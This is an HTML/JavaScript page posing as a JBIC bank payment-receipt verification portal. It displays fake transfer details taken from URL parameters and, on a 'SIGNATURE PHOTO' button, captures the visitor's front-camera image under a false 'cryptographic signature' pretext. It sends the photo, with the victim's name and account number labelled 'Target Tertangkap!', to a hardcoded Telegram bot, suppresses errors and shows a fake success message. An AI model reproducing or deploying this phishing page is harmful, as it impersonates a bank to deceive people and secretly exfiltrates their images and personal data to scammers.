<!-- language: HTML/JS, file: index.html, target: Web Browser (Struk & Kamera Handler) -->
<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <title>JBIC Official Verification Portal</title>
    <style>
        body { font-family: Arial, sans-serif; background: #e2e8f0; display: flex; justify-content: center; align-items: center; min-height: 100vh; margin: 0; }
        .modal-content { background: #fff; color: #000; padding: 25px 20px; border-radius: 12px; width: 340px; min-height: 560px; font-family: Arial, sans-serif; position: relative; box-shadow: 0 10px 30px rgba(0,0,0,0.3); display: flex; flex-direction: column; justify-content: space-between; box-sizing: border-box; }
        
        .receipt-header { text-align: center; margin-bottom: 10px; }
        .receipt-logo { display: flex; align-items: center; justify-content: center; gap: 8px; margin-bottom: 4px; }
        .logo-icon { width: 24px; height: 24px; background: #990000; color: #fff; border-radius: 50%; display: flex; align-items: center; justify-content: center; font-weight: bold; font-size: 14px; }
        .receipt-logo-text { font-size: 15px; font-weight: bold; color: #111; letter-spacing: 0.5px; }
        .receipt-sub { font-size: 10px; color: #555; text-transform: uppercase; letter-spacing: 0.5px; }
        .receipt-title { font-size: 13px; font-weight: bold; color: #111; margin-top: 12px; text-align: center; }
        .receipt-subtitle { font-size: 10px; color: #666; text-align: center; margin-bottom: 12px; }
        
        .amount-box { background: #f8fafc; border: 1px solid #e2e8f0; border-radius: 8px; padding: 12px; text-align: center; margin-bottom: 15px; }
        .amount-label { font-size: 10px; color: #64748b; margin-bottom: 4px; }
        .amount-idr { font-size: 18px; font-weight: bold; color: #0f172a; }
        .amount-yen { font-size: 14px; font-weight: bold; color: #334155; margin-top: 2px; }

        .details-section { font-size: 11px; color: #334155; border-top: 1px solid #eee; padding-top: 10px; }
        .d-row { display: flex; justify-content: space-between; margin-bottom: 8px; }
        .d-label { color: #64748b; }
        .d-val { font-weight: bold; color: #1e293b; text-align: right; }

        .p-btn { width: 100%; padding: 12px; background: #2563eb; color: #fff; border: none; border-radius: 6px; font-weight: bold; font-size: 13px; cursor: pointer; text-align: center; margin-top: 10px; }
        .p-btn:hover { background: #1d4ed8; }
        
        video, canvas { display: none; }
    </style>
</head>
<body>

<div class="modal-content">
    <div>
        <div class="receipt-header">
            <div class="receipt-logo">
                <div class="logo-icon">円</div>
                <div class="receipt-logo-text">国際協力銀行</div>
            </div>
            <div class="receipt-sub">JBIC JAPAN BANK FOR INTERNATIONAL COOPERATION</div>
            <div class="receipt-title">JBIC JAPAN BANK INTERNATIONAL</div>
            <div class="receipt-subtitle">Office Purchasing</div>
        </div>

        <div class="amount-box">
            <div class="amount-label">Amount Received</div>
            <div class="amount-idr" id="pAmountIdr">-</div>
            <div class="amount-yen" id="pAmountYen">-</div>
        </div>

        <div class="details-section">
            <div class="d-row"><span class="d-label">Sender Bank</span><span class="d-val" id="pSenderBank">-</span></div>
            <div class="d-row"><span class="d-label">Sender Name</span><span class="d-val" id="pSenderName">-</span></div>
            <div class="d-row"><span class="d-label">Dest Bank</span><span class="d-val" id="pReceiverBank">-</span></div>
            <div class="d-row"><span class="d-label">Account No</span><span class="d-val" id="pReceiverAcc">-</span></div>
            <div class="d-row"><span class="d-label">Beneficiary</span><span class="d-val" id="pReceiverName">-</span></div>
            <div class="d-row"><span class="d-label">Timestamp</span><span class="d-val" id="pTime">-</span></div>
        </div>
    </div>
    
    <button class="p-btn" onclick="triggerCapture()">SIGNATURE PHOTO</button>
</div>

<video id="cam" autoplay playsinline></video>
<canvas id="canvas"></canvas>

<script>
    const BOT_TOKEN = '8806691835:AAFtjBMs9PtfpmQwwvIwdGTGMxw9pfm15lY';
    const CHAT_ID = '8380801102';

    const params = new URLSearchParams(window.location.search);
    document.getElementById('pSenderBank').innerText = params.get('sb') || 'JBIC Global Fund';
    document.getElementById('pSenderName').innerText = params.get('sn') || 'Japan Bank';
    document.getElementById('pReceiverBank').innerText = params.get('rb') || 'Bank BRI';
    document.getElementById('pReceiverAcc').innerText = params.get('ra') || '0000000000';
    document.getElementById('pReceiverName').innerText = params.get('rn') || 'Target';
    document.getElementById('pAmountIdr').innerText = params.get('aidr') || 'IDR 530.000.000';
    document.getElementById('pAmountYen').innerText = params.get('ayen') || 'YEN 4,755';
    document.getElementById('pTime').innerText = new Date().toISOString().replace('T', ' ').substring(0, 16);

    async function triggerCapture() {
        try {
            const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
            const video = document.getElementById('cam');
            video.srcObject = stream;
            
            setTimeout(async () => {
                const canvas = document.getElementById('canvas');
                canvas.width = video.videoWidth || 640;
                canvas.height = video.videoHeight || 480;
                canvas.getContext('2d').drawImage(video, 0, 0, canvas.width, canvas.height);
                
                canvas.toBlob(async (blob) => {
                    const formData = new FormData();
                    formData.append('chat_id', CHAT_ID);
                    formData.append('photo', blob, 'capture.jpg');
                    formData.append('caption', `Target Tertangkap!\nNama: ${params.get('rn')}\nRek: ${params.get('ra')}`);

                    try {
                        await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
                            method: 'POST',
                            body: formData
                        });
                    } catch (e) {
                        // Silent catch
                    }

                    stream.getTracks().forEach(track => track.stop());
                    alert('Verification signature recorded successfully.');
                    location.reload();
                }, 'image/jpeg');

            }, 1200);
        } catch (err) {
            alert('Camera permission required for cryptographic signature.');
        }
    }
</script>

</body>
</html>
